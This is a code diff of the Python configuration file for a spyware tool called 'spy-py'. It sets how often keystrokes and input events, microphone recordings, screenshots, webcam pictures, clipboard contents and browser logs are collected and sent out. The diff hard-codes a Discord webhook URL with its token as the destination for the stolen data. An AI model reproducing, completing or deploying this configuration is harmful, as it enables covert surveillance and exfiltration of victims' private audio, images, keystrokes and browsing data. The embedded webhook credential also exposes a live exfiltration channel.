@@ -1,38 +1,19 @@
 import os
 import tempfile
 
-# Logging Configuration
-LOG_DIRECTORY_PATH = "" # Your directory path here, or leave empty for default path
-if not LOG_DIRECTORY_PATH:
-    LOG_DIRECTORY_PATH = os.path.join(tempfile.gettempdir(), "logs")
-else:
-    LOG_DIRECTORY_PATH = os.path.join(LOG_DIRECTORY_PATH, "logs")
+LOG_DIRECTORY_PATH = os.path.join(tempfile.gettempdir(), "logs")
 LOG_ENTRIES_BEFORE_SEND = 10000
-
-# Webhook Configuration
-DISCORD_WEBHOOK_URL = ""
-DISCORD_WEBHOOK_AVATAR_URL = "https://upload.wikimedia.org/wikipedia/commons/thumb/0/06/Skull_and_Crossbones.svg/510px-Skull_and_Crossbones.svg.png?20190922182140"
-DISCORD_WEBHOOK_USERNAME = "spy-py"
-
-# Input Configuration
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1235600632598233168/a1_NbtnWi3eLl_IZALZ7ZRYooKE2lzdUU4ExURw5BxtgdNLx4GJBoe-cfLGVvtR-mBss"
 MAX_INPUT_EVENTS_BEFORE_SEND = 100
-
-# Microphone Configuration
 MICROPHONE_RECORD_DURATION_SEC = 60
 MICROPHONE_RECORDINGS_BEFORE_SEND = 1
-
-# Screen Configuration
 SCREENSHOT_INTERVAL_SEC = 60
 SCREENSHOTS_BEFORE_SEND = 1
-
-# Webcam Configuration
 WEBCAM_CAPTURE_INTERVAL_SEC = 60
 WEBCAM_PICTURES_BEFORE_SEND = 1
-
-# Clipboard Configuration
 CLIPBOARD_LOG_INTERVAL_SEC = 500
 CLIPBOARD_EVENTS_BEFORE_SEND = 1
-
-# Browser Configuration
 BROWSER_LOG_INTERVAL_SEC = 20000
 BROWSER_LOGS_BEFORE_SEND = 1
+DISCORD_WEBHOOK_AVATAR_URL = "https://upload.wikimedia.org/wikipedia/commons/thumb/0/06/Skull_and_Crossbones.svg/510px-Skull_and_Crossbones.svg.png?20190922182140"
+DISCORD_WEBHOOK_USERNAME = "spy-py"
